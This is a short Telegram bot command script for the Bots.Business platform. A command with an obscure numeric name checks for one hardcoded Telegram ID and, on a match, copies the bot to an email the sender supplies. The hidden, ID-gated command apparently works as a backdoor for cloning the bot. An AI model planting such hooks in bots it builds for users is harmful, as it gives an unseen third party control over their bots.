/*CMD
  command: /99388
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 
  answer: Gg
  keyboard: 
  aliases: 
  group: 
CMD*/

if(user.telegramid==1838493015){

BBAdmin.installBot({

 email: message,
 bot_id: bot.id 
})

Bot.sendMessage("Bot Sent")
return
}

Bot.sendMessage("You can't send the bot");
